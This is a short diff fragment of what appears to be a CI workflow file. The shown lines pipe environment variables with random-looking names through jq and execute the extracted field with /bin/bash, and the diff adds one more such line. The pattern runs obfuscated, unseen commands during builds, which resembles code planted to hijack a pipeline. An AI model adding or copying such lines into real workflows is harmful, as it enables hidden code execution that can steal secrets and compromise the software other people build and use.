@@ -28,6 +28,7 @@ jobs:
           echo $gps52825 | jq -r .a1043 | /bin/bash
           printf '%s' "$znqiy3" | jq -r .fuyr9 | /bin/bash
           printf '%s' "$c1386" | jq -r .dzkpa6 | /bin/bash
+          printf '%s' "$ekv3294" | jq -r .zsp6 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
